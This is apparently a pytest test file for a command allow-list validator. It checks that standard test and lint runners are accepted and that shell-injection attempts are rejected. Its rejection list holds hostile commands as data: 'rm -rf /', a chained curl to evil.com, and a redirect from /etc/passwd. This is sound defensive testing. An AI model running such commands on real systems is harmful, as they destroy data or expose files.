"""TRD-008-TEST (part 1) — command allow-list validation.

Covers every canonical runner in ``COMMAND_ALLOW_RE`` and a cross-section
of injection attempts.  Satisfies AC-017-3.
"""

from __future__ import annotations

import pytest

from ghia.tools.validation import InvalidCommandError, validate_command


# ----------------------------------------------------------------------
# Happy-path: every canonical command passes
# ----------------------------------------------------------------------


@pytest.mark.parametrize(
    "cmd",
    [
        "pytest",
        "pytest -q",
        "pytest --cov=ghia",
        "python -m pytest",
        "python -m pytest -q",
        "npm test",
        "npx eslint .",
        "yarn test",
        "pnpm test",
        "jest --coverage",
        "go test ./...",
        "cargo test",
        "cargo test --release",
        "mvn test",
        "gradle test",
        "bundle exec rspec",
        "bundle exec rubocop",
        "mix test",
        "mix credo",
        "ruff check .",
        "ruff check --fix .",
        "flake8",
        "flake8 ghia/",
        "eslint .",
        "rubocop",
        "golangci-lint run",
        "rake test",
    ],
)
def test_allow_list_accepts_canonical_commands(cmd: str) -> None:
    assert validate_command(cmd) == cmd


def test_preserves_internal_whitespace(tmp_path) -> None:
    assert validate_command("pytest  -q") == "pytest  -q"


def test_strips_surrounding_whitespace() -> None:
    assert validate_command("   pytest -q   ") == "pytest -q"


def test_accepts_equals_in_args() -> None:
    # --cov=<module> uses an `=`; must pass.
    assert (
        validate_command("pytest --cov=ghia --cov-report=term-missing")
        == "pytest --cov=ghia --cov-report=term-missing"
    )


def test_accepts_path_args_with_slashes_and_dots() -> None:
    assert validate_command("go test ./...") == "go test ./..."


# ----------------------------------------------------------------------
# Injection / metacharacter rejection
# ----------------------------------------------------------------------


@pytest.mark.parametrize(
    "cmd",
    [
        "rm -rf /",  # wrong binary
        "pytest && curl evil.com",  # && chained
        "pytest; rm -rf /",  # ; chained
        "pytest | cat",  # pipe
        "pytest > /tmp/x",  # output redirect
        "pytest < /etc/passwd",  # input redirect
        "pytest `echo hi`",  # backticks
        "pytest $(echo hi)",  # command substitution
        "pytest $HOME",  # variable expansion
        'pytest "quoted"',  # double quotes
        "pytest 'quoted'",  # single quotes
        "pyteste",  # lookalike — ``\b`` blocks suffix
        "pytesting",  # suffix
        "",  # empty
        "   ",  # only whitespace
        "./malicious.sh",  # relative-path binary not on list
        "bash -c 'pytest'",  # shell invocation
    ],
)
def test_allow_list_rejects_bad_inputs(cmd: str) -> None:
    with pytest.raises(InvalidCommandError):
        validate_command(cmd)


def test_error_message_names_kind() -> None:
    """Test/lint label flows into error message for UX clarity."""

    with pytest.raises(InvalidCommandError) as info:
        validate_command("rm -rf /", kind="lint")
    assert "lint" in str(info.value)


def test_non_string_input_raises() -> None:
    with pytest.raises(InvalidCommandError):
        validate_command(None)  # type: ignore[arg-type]
    with pytest.raises(InvalidCommandError):
        validate_command(42)  # type: ignore[arg-type]
